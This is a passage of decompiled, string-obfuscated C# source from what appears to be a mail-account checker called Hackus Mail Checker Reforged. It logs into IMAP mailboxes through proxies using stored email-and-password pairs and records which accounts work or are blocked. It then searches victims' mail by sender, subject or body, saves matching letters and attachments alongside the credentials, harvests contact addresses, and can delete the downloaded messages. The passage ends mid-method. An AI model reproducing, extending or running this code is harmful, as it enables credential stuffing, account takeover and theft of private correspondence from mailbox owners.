using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Mail.Utilities;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Mail.IMAP
{
	// Token: 0x0200011E RID: 286
	public class ImapHandlerNew : IMailHandler
	{
		// Token: 0x170001BF RID: 447
		// (get) Token: 0x0600090C RID: 2316 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x0600090D RID: 2317 RVA: 0x0000B85F File Offset: 0x00009A5F
		public ImapHandlerNew(Mailbox mailbox, Server server)
		{
			this._mailbox = mailbox;
			this._server = server;
		}

		// Token: 0x0600090E RID: 2318 RVA: 0x00036224 File Offset: 0x00034424
		public OperationResult Connect(ProxyClient proxyClient)
		{
			OperationResult result;
			try
			{
				this._tcpClient = proxyClient.CreateConnection(this._server.Hostname, this._server.Port, null);
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					result = OperationResult.Ok;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (SocketException ex)
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					result = OperationResult.HostNotFound;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				result = OperationResult.Error;
			}
			return result;
		}

		// Token: 0x0600090F RID: 2319 RVA: 0x000362F8 File Offset: 0x000344F8
		public OperationResult Login(out ExceptionType exceptionType)
		{
			exceptionType = ExceptionType.Undefined;
			this._imapClient = new ImapClient();
			int num = CheckerSettings.Instance.Timeout * 1000;
			this._imapClient.ConnectTimeout = num;
			this._imapClient.ReadWriteTimeout = num;
			try
			{
				this._imapClient.Connect(this._server.Hostname, this._server.Port, this._server.Socket == Hackus_Mail_Checker_Reforged.Models.Enums.SocketType.SSL, this._tcpClient);
				this.WaitPause();
				this._imapClient.Authenticate(this._mailbox.Address, this._mailbox.Password);
				return OperationResult.Ok;
			}
			catch (SocketException ex)
			{
				exceptionType = ExceptionType.SocketException;
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					return OperationResult.HostNotFound;
				}
				return OperationResult.Error;
			}
			catch (MailException ex2)
			{
				if (ex2.IsServerDisabled())
				{
					StatisticsManager.Instance.AddBlockedDetails(this._mailbox.Address, ex2.Message);
					return OperationResult.ServerDisabled;
				}
				if (!ex2.IsBlocked())
				{
					StatisticsManager.Instance.AddBadDetails(this._mailbox.Address, ex2.Message);
					return OperationResult.Bad;
				}
				StatisticsManager.Instance.AddBlockedDetails(this._mailbox.Address, ex2.Message);
				return OperationResult.Blocked;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch (IOException)
			{
				exceptionType = ExceptionType.IOException;
			}
			catch (TimeoutException)
			{
				exceptionType = ExceptionType.TimeoutException;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x06000910 RID: 2320 RVA: 0x00036490 File Offset: 0x00034690
		public List<Folder> GetFolders()
		{
			List<Folder> list = null;
			switch (SearchSettings.Instance.FoldersMode)
			{
			case FoldersMode.Inbox:
				list = new List<Folder>
				{
					Folder.Parse(<Module>.smethod_6<string>(2132499449))
				};
				break;
			case FoldersMode.All:
				list = this.GetAllFolders();
				break;
			case FoldersMode.Custom:
				list = this.GetRequiredFolders();
				break;
			}
			if (list == null)
			{
				list = new List<Folder>
				{
					Folder.Parse(<Module>.smethod_2<string>(-1971847226))
				};
			}
			if (!list.Any<Folder>())
			{
				list.Add(Folder.Parse(<Module>.smethod_4<string>(-521243277)));
			}
			this._allFolders = list;
			return list;
		}

		// Token: 0x06000911 RID: 2321 RVA: 0x00036530 File Offset: 0x00034730
		public List<Folder> GetAllFolders()
		{
			try
			{
				return this._imapClient.GetAllFolders();
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return new List<Folder>
			{
				Folder.Parse(<Module>.smethod_6<string>(2132499449))
			};
		}

		// Token: 0x06000912 RID: 2322 RVA: 0x0003658C File Offset: 0x0003478C
		public List<Folder> GetRequiredFolders()
		{
			List<Folder> list = new List<Folder>();
			foreach (Folder folder in this.SearchSettings.Folders)
			{
				if (folder.IsEnabled)
				{
					list.Add(Folder.Parse(folder.Name));
				}
			}
			return list;
		}

		// Token: 0x06000913 RID: 2323 RVA: 0x000365F8 File Offset: 0x000347F8
		public OperationResult SelectFolder(Folder folder)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					this._imapClient.SelectFolder(folder);
					return OperationResult.Ok;
				}
				catch (AlertException)
				{
					return OperationResult.Bad;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.Error;
		}

		// Token: 0x06000914 RID: 2324 RVA: 0x00036660 File Offset: 0x00034860
		public void SearchMessages()
		{
			List<Folder> folders = this.GetFolders();
			if (folders.Count < 1)
			{
				return;
			}
			List<Request> list = new List<Request>();
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			while (operationResult == OperationResult.Retry)
			{
				operationResult = this.ProcessSearch(folders, list);
				if (operationResult == OperationResult.Error)
				{
					if (num >= 2)
					{
						break;
					}
					num++;
					operationResult = OperationResult.Retry;
				}
				if (operationResult != OperationResult.Ok && !this.Reconnect())
				{
					break;
				}
			}
			foreach (Request request in list)
			{
				int num2 = (this.SearchSettings.DownloadLetters || this.IsAdditionalCheckRequired()) ? request.SavedUids.Count : request.FindedUids.Count;
				if (num2 > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= num2))
				{
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), num2);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), num2);
				}
			}
		}

		// Token: 0x06000915 RID: 2325 RVA: 0x0003679C File Offset: 0x0003499C
		private OperationResult ProcessSearch(List<Folder> allFolders, List<Request> checkedRequests)
		{
			Request request4 = null;
			bool flag = this.IsAdditionalCheckRequired();
			try
			{
				Func<AttachmentMessageInfo, bool> <>9__11;
				int l;
				int i;
				Func<string, bool> <>9__1;
				Func<Uid, bool> <>9__2;
				Func<Uid, bool> <>9__3;
				for (i = 0; i < allFolders.Count; i = l + 1)
				{
					this.WaitPause();
					if (allFolders[i].MessageCount != 0)
					{
						try
						{
							this._imapClient.SelectFolder(allFolders[i]);
						}
						catch (ThreadAbortException)
						{
							throw;
						}
						catch (MailException ex)
						{
							if (ex.Message != null)
							{
								string text = ex.Message.ToLower();
								if (text.Contains(<Module>.smethod_3<string>(-704876428)) || text.Contains(<Module>.smethod_6<string>(-1690236542)))
								{
									goto IL_1AC2;
								}
							}
							throw;
						}
						using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								Request request = enumerator.Current;
								if (!this.SearchSettings.Search)
								{
									break;
								}
								this.WaitPause();
								try
								{
									try
									{
										Request request2 = checkedRequests.FirstOrDefault((Request r) => ImapHandlerNew.<>c__DisplayClass15_2.smethod_0(r.Sender, request.Sender) && ImapHandlerNew.<>c__DisplayClass15_2.smethod_0(r.Body, request.Body) && ImapHandlerNew.<>c__DisplayClass15_2.smethod_0(r.Subject, request.Subject));
										if (request2 != null)
										{
											if (!request2.IsChecked)
											{
												IEnumerable<string> checkedFolders = request2.CheckedFolders;
												Func<string, bool> predicate;
												if ((predicate = <>9__1) == null)
												{
													predicate = (<>9__1 = ((string u) => ImapHandlerNew.<>c__DisplayClass15_1.smethod_0(u, allFolders[i].Name)));
												}
												if (!checkedFolders.Any(predicate) && (request2.SavedUids == null || request2.SavedUids.Count < this.SearchSettings.DownloadLettersLimit))
												{
													goto IL_1D4;
												}
											}
											continue;
										}
										request2 = request.Clone();
										request2.FindedUids = new HashSet<Uid>();
										request2.SavedUids = new HashSet<Uid>();
										request2.CheckedFolders = new HashSet<string>();
										checkedRequests.Add(request2);
										IL_1D4:
										request4 = request2;
										IEnumerable<Uid> findedUids = request2.FindedUids;
										Func<Uid, bool> predicate2;
										if ((predicate2 = <>9__2) == null)
										{
											predicate2 = (<>9__2 = ((Uid u) => ImapHandlerNew.<>c__DisplayClass15_1.smethod_0(u.Folder.Name, allFolders[i].Name)));
										}
										Uid[] array;
										if (!findedUids.Any(predicate2))
										{
											array = this._imapClient.Search(this.BuildSearchCondition(request2));
										}
										else
										{
											IEnumerable<Uid> findedUids2 = request2.FindedUids;
											Func<Uid, bool> predicate3;
											if ((predicate3 = <>9__3) == null)
											{
												predicate3 = (<>9__3 = ((Uid u) => ImapHandlerNew.<>c__DisplayClass15_1.smethod_0(u.Folder.Name, allFolders[i].Name)));
											}
											array = findedUids2.Where(predicate3).ToArray<Uid>();
										}
										Uid[] array2 = array;
										if (array2.Length != 0)
										{
											request2.FindedUids.UnionWith(array2);
											if (request2.Sender != null && request2.Body == null && request2.Subject == null)
											{
												if (this.SearchSettings.DownloadLetters || flag)
												{
													if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
													{
														request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
													}
													Uid[] array3 = array2;
													for (l = 0; l < array3.Length; l++)
													{
														Uid uid = array3[l];
														this.WaitPause();
														if (!request2.SavedUids.Any((Uid u) => u == uid))
														{
															if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
															{
																break;
															}
															MailMessage mailMessage;
															try
															{
																mailMessage = ((request2.Errors != 0 || this.SearchSettings.CheckDate || request4.CheckDate) ? this._imapClient.FetchMessage(uid, true, true) : this._imapClient.FetchFrom(uid));
															}
															catch (ThreadAbortException)
															{
																throw;
															}
															catch (Exception ex2)
															{
																if (ex2.Message == null || !ex2.Message.Contains(<Module>.smethod_5<string>(1891727559)))
																{
																	throw;
																}
																goto IL_51A;
															}
															if (mailMessage != null && !string.IsNullOrEmpty(mailMessage.From) && mailMessage.From.ContainsIgnoreCase(request2.Sender) && this.ValidateDate(request4, mailMessage.Date))
															{
																if (this.SearchSettings.DownloadLetters)
																{
																	try
																	{
																		mailMessage = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
																	}
																	catch (ThreadAbortException)
																	{
																		throw;
																	}
																	catch (Exception ex3)
																	{
																		if (ex3.Message == null || !ex3.Message.Contains(<Module>.smethod_4<string>(-401647309)))
																		{
																			throw;
																		}
																		goto IL_51A;
																	}
																	if (mailMessage != null && mailMessage.AlternateViews.Count != 0)
																	{
																		request2.SavedUids.Add(uid);
																		FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage);
																		if (mailMessage.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments)
																		{
																			if (this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																			{
																				FileManager.SaveAttachments(mailMessage.AdditionalFiles, this._mailbox.Address);
																			}
																		}
																	}
																}
																else
																{
																	request2.SavedUids.Add(uid);
																}
															}
														}
														IL_51A:;
													}
												}
											}
											else if (request2.Sender == null && request2.Body == null && request2.Subject != null)
											{
												if (this.SearchSettings.DownloadLetters || flag)
												{
													if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
													{
														request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
													}
													Uid[] array3 = array2;
													for (l = 0; l < array3.Length; l++)
													{
														Uid uid = array3[l];
														this.WaitPause();
														if (!request2.SavedUids.Any((Uid u) => u == uid))
														{
															if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
															{
																break;
															}
															MailMessage mailMessage2;
															try
															{
																mailMessage2 = ((request2.Errors != 0 || this.SearchSettings.CheckDate || request4.CheckDate) ? this._imapClient.FetchMessage(uid, true, true) : this._imapClient.FetchSubject(uid));
															}
															catch (ThreadAbortException)
															{
																throw;
															}
															catch (Exception ex4)
															{
																if (ex4.Message == null || !ex4.Message.Contains(<Module>.smethod_6<string>(2021793209)))
																{
																	throw;
																}
																goto IL_7D4;
															}
															if (mailMessage2 != null && !string.IsNullOrEmpty(mailMessage2.Subject) && mailMessage2.Subject.ContainsIgnoreCase(request2.Subject) && this.ValidateDate(request4, mailMessage2.Date))
															{
																if (!this.SearchSettings.DownloadLetters)
																{
																	request2.SavedUids.Add(uid);
																}
																else
																{
																	try
																	{
																		mailMessage2 = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
																	}
																	catch (ThreadAbortException)
																	{
																		throw;
																	}
																	catch (Exception ex5)
																	{
																		if (ex5.Message == null || !ex5.Message.Contains(<Module>.smethod_3<string>(207274666)))
																		{
																			throw;
																		}
																		goto IL_7D4;
																	}
																	if (mailMessage2 != null && mailMessage2.AlternateViews.Count != 0)
																	{
																		request2.SavedUids.Add(uid);
																		FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage2);
																		if (mailMessage2.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																		{
																			FileManager.SaveAttachments(mailMessage2.AdditionalFiles, this._mailbox.Address);
																		}
																	}
																}
															}
														}
														IL_7D4:;
													}
												}
											}
											else if (request2.Sender == null && request2.Body != null && request2.Subject == null && (this.SearchSettings.DownloadLetters || flag))
											{
												if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
												{
													request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
												}
												Uid[] array3 = array2;
												for (l = 0; l < array3.Length; l++)
												{
													Uid uid = array3[l];
													this.WaitPause();
													if (!request2.SavedUids.Any((Uid u) => u == uid))
													{
														if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
														{
															break;
														}
														MailMessage mailMessage3;
														try
														{
															mailMessage3 = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
														}
														catch (ThreadAbortException)
														{
															throw;
														}
														catch (Exception ex6)
														{
															if (ex6.Message == null || !ex6.Message.Contains(<Module>.smethod_5<string>(1891727559)))
															{
																throw;
															}
															goto IL_A0C;
														}
														if (mailMessage3 != null && !string.IsNullOrEmpty(mailMessage3.Body) && mailMessage3.Body.ContainsIgnoreCase(request2.Body) && this.ValidateDate(request4, mailMessage3.Date))
														{
															if (this.SearchSettings.DownloadLetters)
															{
																if (mailMessage3.AlternateViews.Count != 0)
																{
																	request2.SavedUids.Add(uid);
																	FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage3);
																	if (mailMessage3.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																	{
																		FileManager.SaveAttachments(mailMessage3.AdditionalFiles, this._mailbox.Address);
																	}
																}
															}
															else
															{
																request2.SavedUids.Add(uid);
															}
														}
													}
													IL_A0C:;
												}
											}
											if (request2.Sender != null && request2.Body == null && request2.Subject != null)
											{
												if (this.SearchSettings.DownloadLetters || flag)
												{
													if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
													{
														request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
													}
													Uid[] array3 = array2;
													for (l = 0; l < array3.Length; l++)
													{
														Uid uid = array3[l];
														this.WaitPause();
														if (!request2.SavedUids.Any((Uid u) => u == uid))
														{
															if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
															{
																break;
															}
															MailMessage mailMessage4;
															try
															{
																mailMessage4 = this._imapClient.FetchMessage(uid, true, true);
															}
															catch (ThreadAbortException)
															{
																throw;
															}
															catch (Exception ex7)
															{
																if (ex7.Message == null || !ex7.Message.Contains(<Module>.smethod_2<string>(802576006)))
																{
																	throw;
																}
																goto IL_CC5;
															}
															if (mailMessage4 != null && !string.IsNullOrEmpty(mailMessage4.From) && mailMessage4.From.ContainsIgnoreCase(request2.Sender) && !string.IsNullOrEmpty(mailMessage4.Subject) && mailMessage4.Subject.ContainsIgnoreCase(request2.Subject) && this.ValidateDate(request4, mailMessage4.Date))
															{
																if (!this.SearchSettings.DownloadLetters)
																{
																	request2.SavedUids.Add(uid);
																}
																else
																{
																	try
																	{
																		mailMessage4 = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
																	}
																	catch (ThreadAbortException)
																	{
																		throw;
																	}
																	catch (Exception ex8)
																	{
																		if (ex8.Message == null || !ex8.Message.Contains(<Module>.smethod_4<string>(-401647309)))
																		{
																			throw;
																		}
																		goto IL_CC5;
																	}
																	if (mailMessage4 != null && mailMessage4.AlternateViews.Count != 0)
																	{
																		request2.SavedUids.Add(uid);
																		FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage4);
																		if (mailMessage4.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments)
																		{
																			if (this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																			{
																				FileManager.SaveAttachments(mailMessage4.AdditionalFiles, this._mailbox.Address);
																			}
																		}
																	}
																}
															}
														}
														IL_CC5:;
													}
												}
											}
											else if (request2.Sender != null && request2.Body != null && request2.Subject == null)
											{
												if (this.SearchSettings.DownloadLetters || flag)
												{
													if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
													{
														request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
													}
													Uid[] array3 = array2;
													for (l = 0; l < array3.Length; l++)
													{
														Uid uid = array3[l];
														this.WaitPause();
														if (!request2.SavedUids.Any((Uid u) => u == uid))
														{
															if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
															{
																break;
															}
															MailMessage mailMessage5;
															try
															{
																mailMessage5 = ((request2.Errors != 0 || this.SearchSettings.CheckDate || request4.CheckDate) ? this._imapClient.FetchMessage(uid, true, true) : this._imapClient.FetchFrom(uid));
															}
															catch (ThreadAbortException)
															{
																throw;
															}
															catch (Exception ex9)
															{
																if (ex9.Message == null || !ex9.Message.Contains(<Module>.smethod_2<string>(802576006)))
																{
																	throw;
																}
																goto IL_FAC;
															}
															if (mailMessage5 != null && !string.IsNullOrEmpty(mailMessage5.From) && mailMessage5.From.ContainsIgnoreCase(request2.Sender) && this.ValidateDate(request4, mailMessage5.Date))
															{
																try
																{
																	mailMessage5 = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
																}
																catch (ThreadAbortException)
																{
																	throw;
																}
																catch (Exception ex10)
																{
																	if (ex10.Message == null || !ex10.Message.Contains(<Module>.smethod_3<string>(207274666)))
																	{
																		throw;
																	}
																	goto IL_FAC;
																}
																if (mailMessage5 != null && !string.IsNullOrEmpty(mailMessage5.Body) && mailMessage5.Body.ContainsIgnoreCase(request2.Body))
																{
																	if (this.SearchSettings.DownloadLetters)
																	{
																		if (mailMessage5.AlternateViews.Count != 0)
																		{
																			request2.SavedUids.Add(uid);
																			FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage5);
																			if (mailMessage5.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments)
																			{
																				if (this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																				{
																					FileManager.SaveAttachments(mailMessage5.AdditionalFiles, this._mailbox.Address);
																				}
																			}
																		}
																	}
																	else
																	{
																		request2.SavedUids.Add(uid);
																	}
																}
															}
														}
														IL_FAC:;
													}
												}
											}
											else if (request2.Sender == null && request2.Body != null && request2.Subject != null)
											{
												if (this.SearchSettings.DownloadLetters || flag)
												{
													if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
													{
														request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
													}
													Uid[] array3 = array2;
													for (l = 0; l < array3.Length; l++)
													{
														Uid uid = array3[l];
														this.WaitPause();
														if (!request2.SavedUids.Any((Uid u) => u == uid))
														{
															if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
															{
																break;
															}
															MailMessage mailMessage6;
															try
															{
																mailMessage6 = ((request2.Errors != 0 || this.SearchSettings.CheckDate || request4.CheckDate) ? this._imapClient.FetchMessage(uid, true, true) : this._imapClient.FetchSubject(uid));
															}
															catch (ThreadAbortException)
															{
																throw;
															}
															catch (Exception ex11)
															{
																if (ex11.Message == null || !ex11.Message.Contains(<Module>.smethod_2<string>(802576006)))
																{
																	throw;
																}
																goto IL_1293;
															}
															if (mailMessage6 != null && !string.IsNullOrEmpty(mailMessage6.Subject) && mailMessage6.Subject.ContainsIgnoreCase(request2.Subject) && this.ValidateDate(request4, mailMessage6.Date))
															{
																try
																{
																	mailMessage6 = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
																}
																catch (ThreadAbortException)
																{
																	throw;
																}
																catch (Exception ex12)
																{
																	if (ex12.Message == null || !ex12.Message.Contains(<Module>.smethod_5<string>(1891727559)))
																	{
																		throw;
																	}
																	goto IL_1293;
																}
																if (mailMessage6 != null && !string.IsNullOrEmpty(mailMessage6.Body) && mailMessage6.Body.ContainsIgnoreCase(request2.Body))
																{
																	if (this.SearchSettings.DownloadLetters)
																	{
																		if (mailMessage6.AlternateViews.Count != 0)
																		{
																			request2.SavedUids.Add(uid);
																			FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage6);
																			if (mailMessage6.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments)
																			{
																				if (this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																				{
																					FileManager.SaveAttachments(mailMessage6.AdditionalFiles, this._mailbox.Address);
																				}
																			}
																		}
																	}
																	else
																	{
																		request2.SavedUids.Add(uid);
																	}
																}
															}
														}
														IL_1293:;
													}
												}
											}
											else if (request2.Sender != null && request2.Body != null && request2.Subject != null && (this.SearchSettings.DownloadLetters || flag))
											{
												if (flag && CheckerSettings.Instance.UsePop3Limit && array2.Length > CheckerSettings.Instance.Pop3Limit)
												{
													request2.FindedUids = new HashSet<Uid>(request2.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
												}
												Uid[] array3 = array2;
												for (l = 0; l < array3.Length; l++)
												{
													Uid uid = array3[l];
													this.WaitPause();
													if (!request2.SavedUids.Any((Uid u) => u == uid))
													{
														if (request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
														{
															break;
														}
														MailMessage mailMessage7;
														try
														{
															mailMessage7 = this._imapClient.FetchMessage(uid, true, true);
														}
														catch (ThreadAbortException)
														{
															throw;
														}
														catch (Exception ex13)
														{
															if (ex13.Message == null || !ex13.Message.Contains(<Module>.smethod_5<string>(1891727559)))
															{
																throw;
															}
															goto IL_156C;
														}
														if (mailMessage7 != null && !string.IsNullOrEmpty(mailMessage7.From) && mailMessage7.From.ContainsIgnoreCase(request2.Sender) && !string.IsNullOrEmpty(mailMessage7.Subject) && mailMessage7.Subject.ContainsIgnoreCase(request2.Subject) && this.ValidateDate(request4, mailMessage7.Date))
														{
															try
															{
																mailMessage7 = this._imapClient.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.InDownloaded);
															}
															catch (ThreadAbortException)
															{
																throw;
															}
															catch (Exception ex14)
															{
																if (ex14.Message == null || !ex14.Message.Contains(<Module>.smethod_2<string>(802576006)))
																{
																	throw;
																}
																goto IL_156C;
															}
															if (mailMessage7 != null && !string.IsNullOrEmpty(mailMessage7.Body) && mailMessage7.Body.ContainsIgnoreCase(request2.Body))
															{
																if (!this.SearchSettings.DownloadLetters)
																{
																	request2.SavedUids.Add(uid);
																}
																else if (mailMessage7.AlternateViews.Count != 0)
																{
																	request2.SavedUids.Add(uid);
																	FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), mailMessage7);
																	if (mailMessage7.AdditionalFiles.Any<Attachment>() && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded)
																	{
																		FileManager.SaveAttachments(mailMessage7.AdditionalFiles, this._mailbox.Address);
																	}
																}
															}
														}
													}
													IL_156C:;
												}
											}
										}
									}
									finally
									{
										if (i == allFolders.Count - 1)
										{
											request4.IsChecked = true;
										}
										request4.CheckedFolders.Add(allFolders[i].Name);
									}
								}
								catch (ThreadAbortException)
								{
									throw;
								}
								catch (Exception ex15)
								{
									if ((ex15 is IOException || ex15 is SocketException || ex15 is TimeoutException || ex15 is ArgumentNullException || ex15 is NullReferenceException) && request4 != null)
									{
										if (request4.Errors > 2)
										{
											request4.IsChecked = true;
											return OperationResult.Retry;
										}
										request4.Errors++;
										request4.IsChecked = false;
										return OperationResult.Retry;
									}
								}
							}
						}
						if (SearchSettings.Instance.ParseContacts)
						{
							this.WaitPause();
							List<string> list = new List<string>();
							try
							{
								allFolders[i].IsParsedContacts = true;
								Folder folder = allFolders[i];
								if (folder.MessageCount == -1)
								{
									this._imapClient.GetMessagesCount(folder);
									if (folder.MessageCount == -1)
									{
										goto IL_1AC2;
									}
								}
								if (folder.MessageCount == 0)
								{
									goto IL_1AC2;
								}
								int num = 50;
								int num2 = Convert.ToInt32(Math.Ceiling((double)folder.MessageCount / (double)50f));
								if (num2 > 20)
								{
									num2 = 20;
								}
								for (int j = 0; j < num2; j++)
								{
									int num3 = folder.MessageCount - num * j;
									if (num3 < 1)
									{
										num3 = folder.MessageCount;
									}
									int num4 = num3 - num;
									if (num4 < 1)
									{
										num4 = 1;
									}
									string[] array4 = this._imapClient.FetchFromHeaders(string.Format(<Module>.smethod_2<string>(-1006202683), num4, num3));
									if (array4.Any<string>())
									{
										list.AddRange(array4);
									}
								}
							}
							catch (ThreadAbortException)
							{
								throw;
							}
							catch
							{
							}
							if (list.Any<string>())
							{
								foreach (string contact in list)
								{
									ContactsHelper.AddContact(contact);
								}
							}
						}
						if (this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.Everywhere && !allFolders[i].IsSearchedAttachments)
						{
							this.WaitPause();
							try
							{
								allFolders[i].IsSearchedAttachments = true;
								Folder folder2 = allFolders[i];
								if (folder2.MessageCount == -1)
								{
									this._imapClient.GetMessagesCount(folder2);
									if (folder2.MessageCount == -1)
									{
										goto IL_1AC2;
									}
								}
								if (folder2.MessageCount == 0)
								{
									goto IL_1AC2;
								}
								List<AttachmentMessageInfo> list2 = new List<AttachmentMessageInfo>();
								int num5 = 50;
								int num6 = Convert.ToInt32(Math.Ceiling((double)folder2.MessageCount / (double)50f));
								if (num6 > 20)
								{
									num6 = 20;
								}
								for (int k = 0; k < num6; k++)
								{
									int num7 = folder2.MessageCount - num5 * k;
									if (num7 < 1)
									{
										num7 = folder2.MessageCount;
									}
									int num8 = num7 - num5;
									if (num8 < 1)
									{
										num8 = 1;
									}
									AttachmentMessageInfo[] array5 = this._imapClient.FetchAttachmentMessagesInfo(string.Format(<Module>.smethod_6<string>(66824234), num8, num7));
									if (array5 != null && array5.Any<AttachmentMessageInfo>())
									{
										list2.AddRange(array5);
									}
								}
								IEnumerable<AttachmentMessageInfo> source = list2;
								Func<AttachmentMessageInfo, bool> predicate4;
								if ((predicate4 = <>9__11) == null)
								{
									predicate4 = (<>9__11 = ((AttachmentMessageInfo m) => this.IsValidAttachmentMessage(m)));
								}
								foreach (AttachmentMessageInfo attachmentMessageInfo in source.Where(predicate4).ToList<AttachmentMessageInfo>())
								{
									MailMessage mailMessage8 = this._imapClient.FetchMessage(new Uid(int.Parse(attachmentMessageInfo.Uid)), false, false);
									if (mailMessage8 != null)
									{
										FileManager.SaveAttachments(mailMessage8.AdditionalFiles, this._mailbox.Address);
									}
								}
							}
							catch (ThreadAbortException)
							{
								throw;
							}
							catch
							{
							}
						}
						if (SearchSettings.Instance.DeleteWhenDownloaded && !allFolders[i].IsDeletedMessages)
						{
							this.WaitPause();
							try
							{
								allFolders[i].IsDeletedMessages = true;
								HashSet<Uid> hashSet = new HashSet<Uid>();
								foreach (Request request3 in checkedRequests)
								{
									foreach (Uid uid2 in request3.SavedUids)
									{
										if (uid2.Folder.Name == allFolders[i].Name)
										{
											hashSet.Add(uid2);
										}
									}
								}
								this._imapClient.DeleteMessages(hashSet.ToArray<Uid>());
							}
							catch (ThreadAbortException)
